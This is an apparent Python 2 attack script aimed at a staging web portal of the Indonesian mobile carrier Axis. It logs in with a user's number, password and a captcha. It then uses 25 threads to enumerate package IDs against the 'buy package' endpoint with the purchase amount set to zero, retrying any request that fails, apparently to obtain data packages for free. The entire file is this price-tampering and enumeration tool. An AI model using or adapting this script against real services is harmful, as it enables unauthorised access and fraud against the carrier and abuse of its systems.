import os
import sys
import json
import requests
import threading
from PIL import Image
from Queue import Queue

requests = requests.Session()

class send_package(threading.Thread):
    def __init__(self, queue_package_id):
        super(send_package, self).__init__()

        self.package_id = queue_package_id
        self.daemon     = True

    def run(self):
        while True:
            try:
                package_id = self.package_id.get()
                self.send(str(package_id))
            except Exception as e: print '\nException:\n%s' % (e)
            self.package_id.task_done()

    def send(self, package_id):
        form = {}
        form['pkgid'] = package_id
        form['amount'] = '0'

        loop = 0
        while True:
            try:
                sys.stdout.write('%s\r' % (package_id))
                sys.stdout.flush()
                response = requests.post('https://staging.axisnet.id:81/newaxisnetbeta/home/beli_paket', data=form)
                data = json.loads(response.text)
                if (data['status'] == '1'):
                    if (loop == 0):
                        print '%s -> OK' % (package_id)
                        break
                    print '%s -> OK (%s)' % (package_id, loop)
                    break                
                elif (data['status'] == '-1'):
                    print '%s -> %s - %s' % (package_id, data['err_code'], data['err_desc'])
                    break
                else:
                    print '%s -> Exception\n%s' % (package_id, data)
                    break
            except Exception: loop += 1


class axis(object):
    def __init__(self, threads = 25):
        super(axis, self).__init__()

        self.captcha_image    = os.path.dirname(os.path.realpath(__file__))+'/storage/captcha.png'
        self.url_captcha      = 'https://staging.axisnet.id:81/newaxisnetbeta/register/captcha/1'
        self.url_sign_in      = ''
        self.url_send_package = ''

        self.THREADS = threads
        self.SIGNED  = False

    def get_captcha(self):
        while True:
            try:
                print '\nRequesting captcha'
                response = requests.get(self.url_captcha)
                print 'Showing captcha'
                with open(self.captcha_image, 'wb') as file:
                    file.write(response.content)
                Image.open(self.captcha_image).show()
                print 'Done\n'
                self.captcha = raw_input('Captcha: ')
                if self.captcha == '':
                    print '\nComplete'
                    exit()
                break
            except Exception as e:
                print '\nException:\n%s' % (e)
                loop = raw_input('\nPress enter only to request again ')
                if loop != '':
                    print '\nComplete'
                    exit()


    def sign_in(self, number, password):
        while True:
            self.get_captcha()

            form = {}
            form['username']      = str(number)
            form['password']      = str(password)
            form['captcha_login'] = str(self.captcha)

            try:
                print '\nSign in'
                response = requests.post('https://staging.axisnet.id:81/newaxisnetbeta/home/loginex', data=form)
                data = json.loads(response.text)
                if (data['code'] == 1):
                    self.SIGNED = True
                    print 'Done\n'
                    break
                elif (data['code'] == -1):
                    print data
                    break
                else: print data
            except Exception as e: print '\nSign in Exception:\n%s\n' % (e)

    def send_package(self, package_start, package_stop = ''):
        if package_stop == '':
            package_stop = package_start

        queue_package_id = Queue()

        for i in range(int(self.THREADS)):
            task = send_package(queue_package_id)
            task.start()

        for package_id in range(int(package_start), int(package_stop)+1):
            queue_package_id.put(package_id)

        queue_package_id.join()
